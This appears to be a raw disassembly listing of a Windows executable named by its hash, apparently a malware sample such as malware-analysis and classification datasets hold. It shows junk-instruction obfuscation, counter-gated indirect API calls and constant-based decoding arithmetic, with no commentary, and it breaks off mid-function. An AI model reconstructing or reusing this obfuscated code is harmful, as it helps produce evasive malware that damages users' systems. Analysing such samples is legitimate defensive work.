
0da918ebd5cddc56c27be719b4da8eac17265e068699b036aaa24c9a37cc7376.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xe4
  401009:	push   edi
  40100a:	or     DWORD PTR ds:0x42b018,0x42d018
  401014:	push   0x42e3c7
  401019:	xor    edi,edi
  40101b:	add    DWORD PTR ds:0x42d000,0x42d008
  401025:	inc    edi
  401026:	adc    DWORD PTR ds:0x42901c,0x42c00c
  401030:	push   edi
  401031:	dec    DWORD PTR ds:0x42a018
  401037:	push   edi
  401038:	not    DWORD PTR ds:0x42901c
  40103e:	call   DWORD PTR ds:0x42e90f
  401044:	test   eax,eax
  401046:	je     0x40106f
  40104c:	lea    eax,[ebp-0x50]
  40104f:	push   eax
  401050:	adc    DWORD PTR ds:0x42c018,0x408c
  40105a:	call   DWORD PTR ds:0x42e927
  401060:	mov    DWORD PTR ds:0x42c010,0x701a
  40106a:	jmp    0x4025df
  40106f:	or     DWORD PTR ds:0x42a010,0x42901c
  401079:	push   esi
  40107a:	or     DWORD PTR ds:0x42c018,0x254e
  401084:	mov    esi,DWORD PTR ds:0x42e90b
  40108a:	sub    DWORD PTR ds:0x42c000,0x42b014
  401094:	push   0x8
  401096:	add    DWORD PTR ds:0x42c004,0x1529
  4010a0:	push   0x42e3d7
  4010a5:	sub    DWORD PTR ds:0x42b00c,0x42c010
  4010af:	call   esi
  4010b1:	test   eax,eax
  4010b3:	je     0x4010f0
  4010b9:	sub    DWORD PTR ds:0x429004,0x42c000
  4010c3:	lea    eax,[ebp-0x50]
  4010c6:	sub    DWORD PTR ds:0x429000,0x1be5
  4010d0:	push   eax
  4010d1:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010db:	call   DWORD PTR ds:0x42e927
  4010e1:	mov    DWORD PTR ds:0x42b000,0x51df
  4010eb:	jmp    0x4025de
  4010f0:	push   ebx
  4010f1:	mov    ebx,DWORD PTR ds:0x429028
  4010f7:	or     ebx,DWORD PTR ds:0x429008
  4010fd:	mov    DWORD PTR ds:0x429028,ebx
  401103:	mov    ebx,DWORD PTR ds:0x42e907
  401109:	add    DWORD PTR ds:0x429024,0x4675
  401113:	push   0x42e3e7
  401118:	or     DWORD PTR ds:0x42c008,0x42c018
  401122:	push   edi
  401123:	adc    DWORD PTR ds:0x42c014,0x42b014
  40112d:	push   edi
  40112e:	call   ebx
  401130:	and    DWORD PTR ds:0x429020,0x61d3
  40113a:	test   eax,eax
  40113c:	jne    0x40121c
  401142:	sbb    DWORD PTR ds:0x42c004,0x42b004
  40114c:	push   0xc
  40114e:	mov    DWORD PTR ds:0x42d004,0x2d3b
  401158:	push   0x42e40b
  40115d:	call   esi
  40115f:	inc    DWORD PTR ds:0x42c008
  401165:	test   eax,eax
  401167:	mov    DWORD PTR ds:0x42b010,0x1593
  401171:	jne    0x40121c
  401177:	sub    DWORD PTR ds:0x42d000,0x17f0
  401181:	push   0x7
  401183:	add    DWORD PTR ds:0x429024,0x2885
  40118d:	push   0x42e41f
  401192:	call   esi
  401194:	and    DWORD PTR ds:0x42d014,0x42c000
  40119e:	test   eax,eax
  4011a0:	mov    DWORD PTR ds:0x42c014,0x720
  4011aa:	jne    0x40121c
  4011b0:	or     DWORD PTR ds:0x42b004,0x42b01c
  4011ba:	push   0x8
  4011bc:	push   0x42e42f
  4011c1:	sbb    DWORD PTR ds:0x42d014,0x5687
  4011cb:	call   esi
  4011cd:	xor    DWORD PTR ds:0x429014,0x42b018
  4011d7:	test   eax,eax
  4011d9:	mov    DWORD PTR ds:0x42d008,0x6461
  4011e3:	jne    0x40121c
  4011e9:	mov    DWORD PTR ds:0x42a014,0x128
  4011f3:	push   0x42e43f
  4011f8:	push   edi
  4011f9:	push   edi
  4011fa:	adc    DWORD PTR ds:0x429020,0x42a000
  401204:	call   DWORD PTR ds:0x42e90f
  40120a:	test   eax,eax
  40120c:	mov    DWORD PTR ds:0x42a01c,0x679f
  401216:	je     0x401249
  40121c:	lea    eax,[ebp-0x50]
  40121f:	sub    DWORD PTR ds:0x42c004,0x42a000
  401229:	push   eax
  40122a:	adc    DWORD PTR ds:0x429024,0xd32
  401234:	call   DWORD PTR ds:0x42e927
  40123a:	mov    DWORD PTR ds:0x42d008,0x45e0
  401244:	jmp    0x4025dd
  401249:	sub    DWORD PTR ds:0x429004,0x429014
  401253:	push   0x42e44f
  401258:	push   edi
  401259:	and    DWORD PTR ds:0x42b00c,0x7ff1
  401263:	push   edi
  401264:	or     DWORD PTR ds:0x42d014,0x42c01c
  40126e:	call   ebx
  401270:	test   eax,eax
  401272:	mov    DWORD PTR ds:0x429028,0x42c
  40127c:	je     0x401766
  401282:	xor    DWORD PTR ds:0x42b01c,0x42a010
  40128c:	push   0xc
  40128e:	xor    DWORD PTR ds:0x42d00c,0x685
  401298:	push   0x42e473
  40129d:	and    DWORD PTR ds:0x42a01c,0x363a
  4012a7:	call   esi
  4012a9:	test   eax,eax
  4012ab:	mov    DWORD PTR ds:0x42b014,0x15a6
  4012b5:	jne    0x40175f
  4012bb:	mov    DWORD PTR ds:0x42b01c,0x5b0e
  4012c5:	push   0x7
  4012c7:	push   0x42e487
  4012cc:	call   esi
  4012ce:	test   eax,eax
  4012d0:	jne    0x40175f
  4012d6:	push   0x8
  4012d8:	push   0x42e497
  4012dd:	call   esi
  4012df:	or     DWORD PTR ds:0x42c018,0x5fc7
  4012e9:	test   eax,eax
  4012eb:	mov    DWORD PTR ds:0x42b01c,0x6bd8
  4012f5:	jne    0x40175f
  4012fb:	add    DWORD PTR ds:0x429000,0x429014
  401305:	push   0x42e4a7
  40130a:	push   edi
  40130b:	push   edi
  40130c:	xor    DWORD PTR ds:0x42d014,0x5ea1
  401316:	call   DWORD PTR ds:0x42e90f
  40131c:	sub    DWORD PTR ds:0x42901c,0x42c008
  401326:	test   eax,eax
  401328:	mov    DWORD PTR ds:0x42a004,0x3a7d
  401332:	jne    0x40175f
  401338:	push   0x42e4b7
  40133d:	and    DWORD PTR ds:0x42a004,0x429004
  401347:	push   edi
  401348:	or     DWORD PTR ds:0x42a01c,0x6055
  401352:	push   edi
  401353:	sub    DWORD PTR ds:0x429014,0x42b00c
  40135d:	call   ebx
  40135f:	xor    DWORD PTR ds:0x42b008,0x42a018
  401369:	test   eax,eax
  40136b:	mov    DWORD PTR ds:0x429014,0x3a80
  401375:	jne    0x40175f
  40137b:	or     DWORD PTR ds:0x42b00c,0x42b010
  401385:	push   0xc
  401387:	push   0x42e4db
  40138c:	call   esi
  40138e:	test   eax,eax
  401390:	jne    0x40175f
  401396:	mov    DWORD PTR ds:0x42900c,0x5e8c
  4013a0:	push   0x7
  4013a2:	push   0x42e4ef
  4013a7:	and    DWORD PTR ds:0x42b010,0x4122
  4013b1:	call   esi
  4013b3:	test   eax,eax
  4013b5:	mov    DWORD PTR ds:0x42a018,0x79ff
  4013bf:	jne    0x40175f
  4013c5:	push   0x8
  4013c7:	push   0x42e4ff
  4013cc:	call   esi
  4013ce:	test   eax,eax
  4013d0:	jne    0x40175f
  4013d6:	or     DWORD PTR ds:0x42a00c,0x42b01c
  4013e0:	push   0x42e50f
  4013e5:	sbb    DWORD PTR ds:0x42d004,0x5fa0
  4013ef:	push   edi
  4013f0:	and    DWORD PTR ds:0x42900c,0x42d00c
  4013fa:	push   edi
  4013fb:	add    DWORD PTR ds:0x42c010,0x54c5
  401405:	call   DWORD PTR ds:0x42e90f
  40140b:	mov    DWORD PTR ds:0x42b010,0x4d18
  401415:	test   eax,eax
  401417:	mov    DWORD PTR ds:0x42b018,0x69c2
  401421:	jne    0x40175f
  401427:	or     DWORD PTR ds:0x42c004,0x44f8
  401431:	push   0x42e51f
  401436:	add    DWORD PTR ds:0x42c004,0x42b01c
  401440:	push   edi
  401441:	adc    DWORD PTR ds:0x429004,0x4c2b
  40144b:	push   edi
  40144c:	call   ebx
  40144e:	test   eax,eax
  401450:	mov    DWORD PTR ds:0x42a008,0x516b
  40145a:	jne    0x40175f
  401460:	add    DWORD PTR ds:0x42d014,0x429018
  40146a:	push   0xc
  40146c:	push   0x42e543
  401471:	mov    DWORD PTR ds:0x42a004,0x58e8
  40147b:	call   esi
  40147d:	sbb    DWORD PTR ds:0x429028,0x2f15
  401487:	test   eax,eax
  401489:	jne    0x40175f
  40148f:	adc    DWORD PTR ds:0x42b000,0x4b6d
  401499:	push   0x7
  40149b:	sbb    DWORD PTR ds:0x42c014,0x42d004
  4014a5:	push   0x42e557
  4014aa:	or     DWORD PTR ds:0x42d008,0x1d0d
  4014b4:	call   esi
  4014b6:	xor    DWORD PTR ds:0x42c018,0xe1e
  4014c0:	test   eax,eax
  4014c2:	mov    DWORD PTR ds:0x42c010,0x6fc5
  4014cc:	jne    0x40175f
  4014d2:	push   0x8
  4014d4:	push   0x42e567
  4014d9:	add    DWORD PTR ds:0x42d000,0x42d018
  4014e3:	call   esi
  4014e5:	test   eax,eax
  4014e7:	jne    0x40175f
  4014ed:	push   0x42e577
  4014f2:	push   edi
  4014f3:	or     DWORD PTR ds:0x42d01c,0x429028
  4014fd:	push   edi
  4014fe:	call   DWORD PTR ds:0x42e90f
  401504:	test   eax,eax
  401506:	mov    DWORD PTR ds:0x42b018,0xe81
  401510:	jne    0x40175f
  401516:	or     DWORD PTR ds:0x42c00c,0x42b014
  401520:	push   0x42e587
  401525:	sub    DWORD PTR ds:0x42c004,0x429028
  40152f:	push   edi
  401530:	xor    DWORD PTR ds:0x42d010,0x42901c
  40153a:	push   edi
  40153b:	and    DWORD PTR ds:0x42d014,0x50c
  401545:	call   ebx
  401547:	test   eax,eax
  401549:	mov    DWORD PTR ds:0x42c008,0x6727
  401553:	jne    0x40175f
  401559:	push   0xc
  40155b:	adc    DWORD PTR ds:0x42a00c,0x1435
  401565:	push   0x42e5ab
  40156a:	mov    DWORD PTR ds:0x42c00c,0x3eef
  401574:	call   esi
  401576:	xor    DWORD PTR ds:0x42b014,0x10aa
  401580:	test   eax,eax
  401582:	mov    DWORD PTR ds:0x42a014,0x7a40
  40158c:	jne    0x40175f
  401592:	push   0x7
  401594:	adc    DWORD PTR ds:0x42b008,0x42a010
  40159e:	push   0x42e5bf
  4015a3:	or     DWORD PTR ds:0x42d004,0x42c014
  4015ad:	call   esi
  4015af:	add    DWORD PTR ds:0x42b008,0x42b014
  4015b9:	test   eax,eax
  4015bb:	mov    DWORD PTR ds:0x42c000,0x2197
  4015c5:	jne    0x40175f
  4015cb:	sub    DWORD PTR ds:0x42a004,0x42b008
  4015d5:	push   0x8
  4015d7:	sbb    DWORD PTR ds:0x42a000,0x42d01c
  4015e1:	push   0x42e5cf
  4015e6:	adc    DWORD PTR ds:0x42b00c,0x429010
  4015f0:	call   esi
  4015f2:	mov    DWORD PTR ds:0x42c004,0x76c3
  4015fc:	test   eax,eax
  4015fe:	mov    DWORD PTR ds:0x42901c,0x7b99
  401608:	jne    0x40175f
  40160e:	adc    DWORD PTR ds:0x42c008,0x42901c
  401618:	push   0x42e5df
  40161d:	push   edi
  40161e:	push   edi
  40161f:	call   DWORD PTR ds:0x42e90f
  401625:	adc    DWORD PTR ds:0x42a004,0x43e7
  40162f:	test   eax,eax
  401631:	jne    0x40175f
  401637:	sbb    DWORD PTR ds:0x42b00c,0x42c008
  401641:	push   0x42e5ef
  401646:	or     DWORD PTR ds:0x42d00c,0x67f5
  401650:	push   edi
  401651:	mov    DWORD PTR ds:0x42c008,0x11d2
  40165b:	push   edi
  40165c:	add    DWORD PTR ds:0x429024,0x35c0
  401666:	call   ebx
  401668:	adc    DWORD PTR ds:0x42a01c,0x475f
  401672:	test   eax,eax
  401674:	mov    DWORD PTR ds:0x42c010,0x9db
  40167e:	jne    0x40175f
  401684:	add    DWORD PTR ds:0x42b01c,0x42c010
  40168e:	push   0xc
  401690:	push   0x42e613
  401695:	call   esi
  401697:	test   eax,eax
  401699:	jne    0x40175f
  40169f:	push   0x7
  4016a1:	sub    DWORD PTR ds:0x42a010,0x42b00c
  4016ab:	push   0x42e627
  4016b0:	xor    DWORD PTR ds:0x42a000,0x46f8
  4016ba:	call   esi
  4016bc:	sub    DWORD PTR ds:0x429028,0x1e37
  4016c6:	test   eax,eax
  4016c8:	mov    DWORD PTR ds:0x429008,0x34bb
  4016d2:	jne    0x40175f
  4016d8:	adc    DWORD PTR ds:0x42d01c,0x42d008
  4016e2:	push   0x8
  4016e4:	neg    DWORD PTR ds:0x42d004
  4016ea:	push   0x42e637
  4016ef:	call   esi
  4016f1:	xor    DWORD PTR ds:0x429020,0x5303
  4016fb:	test   eax,eax
  4016fd:	jne    0x40175f
  401703:	sub    DWORD PTR ds:0x429014,0x42c01c
  40170d:	push   0x42e647
  401712:	not    DWORD PTR ds:0x429000
  401718:	push   edi
  401719:	or     DWORD PTR ds:0x42c01c,0x7461
  401723:	push   edi
  401724:	call   DWORD PTR ds:0x42e90f
  40172a:	test   eax,eax
  40172c:	mov    DWORD PTR ds:0x42901c,0x5bee
  401736:	jne    0x40175f
  40173c:	sbb    DWORD PTR ds:0x42c008,0x1a2b
  401746:	push   0x42e657
  40174b:	push   edi
  40174c:	neg    DWORD PTR ds:0x42b010
  401752:	push   edi
  401753:	sbb    DWORD PTR ds:0x42c000,0x42b008
  40175d:	call   ebx
  40175f:	xor    eax,eax
  401761:	jmp    0x4025dd
  401766:	mov    esi,DWORD PTR ds:0x41cde0
  40176c:	mov    eax,ds:0x41ce2c
  401771:	sub    eax,esi
  401773:	xor    esi,DWORD PTR [esi+eax*1]
  401776:	mov    DWORD PTR [ebp-0x10],0x0
  40177d:	mov    eax,DWORD PTR [ebp-0x34]
  401780:	mov    DWORD PTR [ebp-0x34],eax
  401783:	mov    ecx,0xf89c8585
  401788:	neg    edi
  40178a:	mov    DWORD PTR [ebp-0x8],ecx
  40178d:	mov    edx,DWORD PTR ds:0x42d018
  401793:	sub    edx,DWORD PTR ds:0x42b000
  401799:	mov    DWORD PTR ds:0x42d018,edx
  40179f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4017a6:	xor    esi,esi
  4017a8:	add    esi,DWORD PTR ds:0x41cd71
  4017ae:	xor    edx,edx
  4017b0:	add    edx,DWORD PTR ds:0x41cdf8
  4017b6:	sub    esi,edx
  4017b8:	and    esi,DWORD PTR [esi+edx*1]
  4017bb:	lea    eax,[ebp-0x3c]
  4017be:	and    DWORD PTR ds:0x42c000,0x550f
  4017c8:	mov    DWORD PTR [ebp-0x30],eax
  4017cb:	mov    DWORD PTR ds:0x42a010,0x1f
  4017d5:	cmp    DWORD PTR ds:0x42a010,0x0
  4017dc:	je     0x40182a
  4017e2:	cmp    DWORD PTR ds:0x42a010,0x2a
  4017e9:	jne    0x401805
  4017ef:	push   DWORD PTR [ebp-0x10]
  4017f2:	push   0x7c9b
  4017f7:	push   0x511d
  4017fc:	push   DWORD PTR [ebp-0x1c]
  4017ff:	call   DWORD PTR ds:0x42e8e7
  401805:	mov    edx,DWORD PTR ds:0x42a010
  40180b:	dec    edx
  40180c:	mov    DWORD PTR ds:0x42a010,edx
  401812:	jmp    0x4017d5
  401817:	mov    edx,DWORD PTR ds:0x41cdd8
  40181d:	xor    edi,edi
  40181f:	xor    edi,DWORD PTR ds:0x41ce10
  401825:	sub    edi,edx
  401827:	add    edx,DWORD PTR [edx+edi*1]
  40182a:	lea    eax,[ebp-0x44]
  40182d:	mov    DWORD PTR [ebp-0x18],eax
  401830:	mov    edi,DWORD PTR ds:0x41ce2c
  401836:	mov    edx,DWORD PTR ds:0x41cd89
  40183c:	sub    edx,edi
  40183e:	imul   edi,DWORD PTR [edi+edx*1]
  401842:	mov    eax,ds:0x42e2b7
  401847:	movzx  edx,BYTE PTR ds:0x42a01c
  40184e:	and    edx,DWORD PTR ds:0x42c010
  401854:	mov    DWORD PTR ds:0x42a01c,edx
  40185a:	mov    eax,DWORD PTR [eax+0x1c8]
  401860:	mov    eax,DWORD PTR [eax]
  401862:	xor    edi,edi
  401864:	mov    edx,DWORD PTR [ebp-0x18]
  401867:	mov    esi,DWORD PTR ds:0x429028
  40186d:	and    DWORD PTR ds:0x42d004,esi
  401873:	mov    esi,0x751089b
  401878:	or     DWORD PTR ds:0x42900c,ebx
  40187e:	xor    eax,esi
  401880:	and    DWORD PTR ds:0x42b010,0x0
  40188a:	mov    edi,DWORD PTR ds:0x42b010
  401890:	inc    edi
  401891:	mov    DWORD PTR ds:0x42b010,edi
  401897:	cmp    DWORD PTR ds:0x42b010,0x25
  40189e:	jne    0x4018ba
  4018a4:	push   DWORD PTR [ebp-0x1c]
  4018a7:	push   DWORD PTR [ebp-0x10]
  4018aa:	push   0x42e000
  4018af:	push   0x400000
  4018b4:	call   DWORD PTR ds:0x42e8eb
  4018ba:	cmp    DWORD PTR ds:0x42b010,0x17
  4018c1:	jb     0x40188a
  4018c7:	mov    edi,0x3272e2
  4018cc:	add    eax,edi
  4018ce:	mov    DWORD PTR ds:0x42a010,0x30bc
  4018d8:	mov    DWORD PTR [edx],eax
  4018da:	mov    DWORD PTR ds:0x42c014,0x6382
  4018e4:	mov    eax,ds:0x42e753
  4018e9:	mov    DWORD PTR ds:0x429028,0x5397
  4018f3:	cmp    eax,0x312bc9f6
  4018f8:	jne    0x401986
  4018fe:	mov    eax,DWORD PTR [ebp-0x8]
  401901:	sub    DWORD PTR ds:0x42c004,edx
  401907:	mov    edx,DWORD PTR ds:0x42e2b7
  40190d:	mov    ebx,DWORD PTR ds:0x41ce24
  401913:	mov    ebx,DWORD PTR [ebx]
  401915:	adc    DWORD PTR ds:0x42a018,ebx
  40191b:	mov    edx,DWORD PTR [edx+0x198]
  401921:	xor    ebx,0x3fd0
  401927:	xor    eax,esi
  401929:	sbb    DWORD PTR ds:0x429010,0x42901c
  401933:	add    eax,edi
  401935:	or     DWORD PTR ds:0x42900c,edx
  40193b:	mov    DWORD PTR [edx],eax
  40193d:	mov    eax,DWORD PTR [ebp-0x8]
  401940:	and    DWORD PTR ds:0x42a014,0x0
  40194a:	mov    ebx,DWORD PTR ds:0x42a014
  401950:	inc    ebx
  401951:	mov    DWORD PTR ds:0x42a014,ebx
  401957:	cmp    DWORD PTR ds:0x42a014,0x20
  40195e:	jne    0x40196a
  401964:	call   DWORD PTR ds:0x42e8ef
  40196a:	cmp    DWORD PTR ds:0x42a014,0x1c
  401971:	jb     0x40194a
  401977:	xor    eax,esi
  401979:	add    eax,edi
  40197b:	add    DWORD PTR ds:0x42d00c,ebx
  401981:	mov    ds:0x42e753,eax
  401986:	mov    eax,ds:0x42e2b7
  40198b:	and    DWORD PTR ds:0x42c014,0x7897
  401995:	mov    eax,DWORD PTR [eax+0x18c]
  40199b:	or     DWORD PTR ds:0x42d004,0x42d014
  4019a5:	mov    eax,DWORD PTR [eax]
  4019a7:	sbb    ebx,0x2d4c
  4019ad:	mov    DWORD PTR [ebp-0x7c],eax
  4019b0:	sbb    DWORD PTR ds:0x42c008,edx
  4019b6:	mov    ebx,0xf89c85b9
  4019bb:	neg    eax
  4019bd:	mov    DWORD PTR [ebp-0x10],ebx
  4019c0:	and    DWORD PTR ds:0x42c000,0x0
  4019ca:	mov    eax,ds:0x42c000
  4019cf:	inc    eax
  4019d0:	mov    ds:0x42c000,eax
  4019d5:	cmp    DWORD PTR ds:0x42c000,0xa
  4019dc:	jne    0x4019e8
  4019e2:	call   DWORD PTR ds:0x42e8f3
  4019e8:	cmp    DWORD PTR ds:0x42c000,0x9
  4019ef:	jne    0x401a00
  4019f5:	mov    eax,ds:0x42c000
  4019fa:	inc    eax
  4019fb:	mov    ds:0x42c000,eax
  401a00:	cmp    DWORD PTR ds:0x42c000,0x15
  401a07:	jb     0x4019ca
  401a0d:	movzx  eax,WORD PTR ds:0x42c00c
  401a14:	and    eax,DWORD PTR ds:0x42c018
  401a1a:	mov    ds:0x42c00c,eax
  401a1f:	mov    DWORD PTR [ebp-0x10],ebx
  401a22:	sub    DWORD PTR ds:0x42b004,ecx
  401a28:	mov    DWORD PTR [ebp-0x10],ebx
  401a2b:	mov    DWORD PTR [ebp-0x18],ecx
  401a2e:	mov    DWORD PTR [ebp-0x10],ebx
  401a31:	dec    DWORD PTR ds:0x42c014
  401a37:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401a3e:	mov    eax,ds:0x42a010
  401a43:	adc    DWORD PTR ds:0x42b00c,eax
  401a49:	mov    eax,DWORD PTR [ebp-0x8]
  401a4c:	add    DWORD PTR ds:0x42a004,0x42901c
  401a56:	xor    eax,esi
  401a58:	add    eax,edi
  401a5a:	mov    DWORD PTR ds:0x42d00c,0x4361
  401a64:	jmp    0x401b08
  401a69:	and    eax,ecx
  401a6b:	mov    eax,DWORD PTR [ebp-0xc]
  401a6e:	mov    ecx,DWORD PTR [ebp-0x1c]
  401a71:	sbb    DWORD PTR ds:0x42d01c,0x38e1
  401a7b:	xor    eax,esi
  401a7d:	or     DWORD PTR ds:0x42b008,0x32de
  401a87:	lea    eax,[eax+ecx*1+0x3272e2]
  401a8e:	or     DWORD PTR ds:0x42900c,0x42c014
  401a98:	push   eax
  401a99:	mov    eax,DWORD PTR [ebp-0x18]
  401a9c:	mov    DWORD PTR ds:0x42b000,0x3f7a
  401aa6:	xor    eax,esi
  401aa8:	adc    DWORD PTR ds:0x42a000,0x429018
  401ab2:	lea    eax,[ebp+eax*1+0x3272ea]
  401ab9:	or     DWORD PTR ds:0x429000,0x42d01c
  401ac3:	push   eax
  401ac4:	sbb    eax,DWORD PTR ds:0x429000
  401aca:	mov    eax,ds:0x42e2b7
  401acf:	push   DWORD PTR [eax+0x1bc]
  401ad5:	and    DWORD PTR ds:0x42d014,0x65ae
  401adf:	call   0x4025f2
  401ae4:	mov    eax,DWORD PTR [ebp-0xc]
  401ae7:	or     edx,0x44
  401aed:	mov    ecx,DWORD PTR [ebp-0x1c]
  401af0:	neg    edx
  401af2:	xor    eax,esi
  401af4:	movzx  edx,BYTE PTR ds:0x42d000
  401afb:	add    DWORD PTR ds:0x429008,edx
  401b01:	lea    eax,[ecx+eax*1+0x3272e2]
  401b08:	mov    ecx,DWORD PTR [ebp-0xc]
  401b0b:	sbb    DWORD PTR ds:0x42900c,0x42c010
  401b15:	mov    edx,DWORD PTR [ebp-0xc]
  401b18:	sbb    DWORD PTR ds:0x42c00c,0x3f25
  401b22:	xor    edx,esi
  401b24:	xor    DWORD PTR ds:0x42901c,0x360b
  401b2e:	xor    ecx,esi
  401b30:	add    ecx,edx
  401b32:	mov    edx,DWORD PTR [ebp-0xc]
  401b35:	xor    edx,esi
  401b37:	lea    ecx,[ecx+edx*1+0x9758a6]
  401b3e:	mov    DWORD PTR ds:0x429010,0x1f54
  401b48:	mov    DWORD PTR [ebp-0x1c],eax
  401b4b:	cmp    eax,ecx
  401b4d:	jbe    0x401a69
  401b53:	mov    eax,ds:0x429020
  401b58:	adc    DWORD PTR ds:0x42901c,eax
  401b5e:	mov    eax,DWORD PTR [ebp+0xc]
  401b61:	mov    ecx,DWORD PTR ds:0x41cd6d
  401b67:	mov    ecx,DWORD PTR [ecx]
  401b69:	or     DWORD PTR ds:0x429028,ecx
  401b6f:	mov    ds:0x42e13b,eax
  401b74:	mov    ecx,DWORD PTR ds:0x429000
  401b7a:	or     DWORD PTR ds:0x42c008,ecx
  401b80:	mov    eax,DWORD PTR [ebp+0x10]
  401b83:	and    DWORD PTR ds:0x42b01c,0x0
  401b8d:	jmp    0x401b9f
  401b92:	mov    ecx,DWORD PTR ds:0x42b01c
  401b98:	inc    ecx
  401b99:	mov    DWORD PTR ds:0x42b01c,ecx
  401b9f:	cmp    DWORD PTR ds:0x42b01c,0x11
  401ba6:	jae    0x401bd3
  401bac:	cmp    DWORD PTR ds:0x42b01c,0x16
  401bb3:	jne    0x401bc4
  401bb9:	push   0x42e0f6
  401bbe:	call   DWORD PTR ds:0x42e8f7
  401bc4:	jmp    0x401b92
  401bc9:	mov    DWORD PTR ds:0x42a018,0x900
  401bd3:	mov    ds:0x42e38f,eax
  401bd8:	adc    DWORD PTR ds:0x42d008,0x597
  401be2:	mov    eax,ds:0x42e13b
  401be7:	mov    DWORD PTR ds:0x42901c,0x19
  401bf1:	cmp    DWORD PTR ds:0x42901c,0x0
  401bf8:	je     0x401c2a
  401bfe:	cmp    DWORD PTR ds:0x42901c,0x23
  401c05:	jne    0x401c16
  401c0b:	push   0x42e075
  401c10:	call   DWORD PTR ds:0x42e8fb
  401c16:	mov    ecx,DWORD PTR ds:0x42901c
  401c1c:	dec    ecx
  401c1d:	mov    DWORD PTR ds:0x42901c,ecx
  401c23:	jmp    0x401bf1
  401c28:	neg    ecx
  401c2a:	mov    ecx,DWORD PTR [ebp-0x30]
  401c2d:	sub    eax,edi
  401c2f:	xor    eax,esi
  401c31:	mov    DWORD PTR [ecx],eax
  401c33:	mov    eax,DWORD PTR [ebp-0x34]
  401c36:	mov    DWORD PTR ds:0x42c014,0x2861
  401c40:	cmp    eax,0xf89c8585
  401c45:	jne    0x401f18
  401c4b:	lea    eax,[ebp-0x48]
  401c4e:	mov    DWORD PTR [ebp-0x9c],eax
  401c54:	lea    eax,[ebp+0x4]
  401c57:	or     DWORD PTR ds:0x42d000,0x2377
  401c61:	mov    DWORD PTR [ebp-0x48],eax
  401c64:	xor    DWORD PTR ds:0x42a018,ecx
  401c6a:	mov    eax,DWORD PTR [ebp-0x48]
  401c6d:	test   eax,eax
  401c6f:	mov    DWORD PTR ds:0x42c00c,0x1657
  401c79:	je     0x4025c2
  401c7f:	mov    eax,DWORD PTR [ebp-0x24]
  401c82:	mov    eax,DWORD PTR [ebp-0xc]
  401c85:	sbb    eax,ecx
  401c87:	mov    eax,DWORD PTR [ebp-0x8]
  401c8a:	or     ecx,DWORD PTR ds:0x42c018
  401c90:	mov    DWORD PTR [ebp+0xc],eax
  401c93:	xor    DWORD PTR ds:0x42a014,edi
  401c99:	mov    eax,eax
  401c9b:	sub    DWORD PTR ds:0x42c000,0x352b
  401ca5:	mov    eax,ds:0x42e2b7
  401caa:	mov    DWORD PTR ds:0x42b014,0x12
  401cb4:	cmp    DWORD PTR ds:0x42b014,0x0
  401cbb:	je     0x401d04
  401cc1:	cmp    DWORD PTR ds:0x42b014,0x7
  401cc8:	jne    0x401cd4
  401cce:	call   DWORD PTR ds:0x42e8ff
  401cd4:	cmp    DWORD PTR ds:0x42b014,0x8
  401cdb:	jne    0x401cf0
  401ce1:	xor    ecx,ecx
  401ce3:	add    ecx,DWORD PTR ds:0x42b014
  401ce9:	dec    ecx
  401cea:	mov    DWORD PTR ds:0x42b014,ecx
  401cf0:	xor    ecx,ecx
  401cf2:	xor    ecx,DWORD PTR ds:0x42b014
  401cf8:	dec    ecx
  401cf9:	mov    DWORD PTR ds:0x42b014,ecx
  401cff:	jmp    0x401cb4
  401d04:	mov    eax,DWORD PTR [eax+0x1c8]
  401d0a:	mov    eax,DWORD PTR [eax]
  401d0c:	mov    DWORD PTR ds:0x429004,0x1d
  401d16:	cmp    DWORD PTR ds:0x429004,0x0
  401d1d:	je     0x401d6d
  401d23:	cmp    DWORD PTR ds:0x429004,0x4
  401d2a:	jne    0x401d41
  401d30:	push   DWORD PTR [ebp-0x28]
  401d33:	push   0x42d000
  401d38:	push   DWORD PTR [ebp-0xc]
  401d3b:	call   DWORD PTR ds:0x42e903
  401d41:	cmp    DWORD PTR ds:0x429004,0x5
  401d48:	jne    0x401d5b
  401d4e:	mov    ecx,DWORD PTR ds:0x429004
  401d54:	dec    ecx
  401d55:	mov    DWORD PTR ds:0x429004,ecx
  401d5b:	mov    ecx,DWORD PTR ds:0x429004
  401d61:	dec    ecx
  401d62:	mov    DWORD PTR ds:0x429004,ecx
  401d68:	jmp    0x401d16
  401d6d:	cdq    
  401d6e:	inc    ecx
  401d6f:	mov    ebx,eax
  401d71:	mov    ecx,DWORD PTR ds:0x42b008
  401d77:	adc    ecx,DWORD PTR ds:0x42b000
  401d7d:	mov    DWORD PTR ds:0x42b008,ecx
  401d83:	mov    eax,0xfabdbee7
  401d88:	and    DWORD PTR ds:0x429014,edi
  401d8e:	add    ebx,eax
  401d90:	mov    DWORD PTR ds:0x42c004,0x916
  401d9a:	adc    edx,0xffffffff
  401d9d:	and    DWORD PTR [ebp-0x10],0x0
  401da1:	or     DWORD PTR ds:0x42b018,0x42d014
  401dab:	xor    edx,0x0
  401dae:	mov    DWORD PTR [ebp-0x6c],edx
  401db1:	adc    DWORD PTR ds:0x42d008,ebx
  401db7:	mov    edx,DWORD PTR [ebp+0xc]
  401dba:	sbb    DWORD PTR ds:0x429004,edi
  401dc0:	mov    DWORD PTR [ebp-0x14],edx
  401dc3:	mov    ecx,0x8a29a12d
  401dc8:	add    edx,0x36ec
  401dce:	xor    ebx,ecx
  401dd0:	add    DWORD PTR [ebp-0x14],eax
  401dd3:	mov    DWORD PTR ds:0x42901c,ebx
  401dd9:	mov    edx,DWORD PTR [ebp-0x14]
  401ddc:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401de0:	xor    edx,ecx
  401de2:	mov    DWORD PTR [ebp-0x5c],edx
  401de5:	or     DWORD PTR ds:0x42a00c,edi
  401deb:	mov    edx,DWORD PTR [ebp-0x10]
  401dee:	xor    DWORD PTR ds:0x42d00c,0x42c018
  401df8:	xor    edx,0x0
  401dfb:	mov    DWORD PTR [ebp-0x58],edx
  401dfe:	mov    DWORD PTR ds:0x42900c,0x40f4
  401e08:	cmp    DWORD PTR [ebp-0x5c],ebx
  401e0b:	mov    DWORD PTR ds:0x42a004,0x5ee8
  401e15:	jne    0x401e3b
  401e1b:	mov    DWORD PTR ds:0x42b004,0x3032
  401e25:	mov    edx,DWORD PTR [ebp-0x6c]
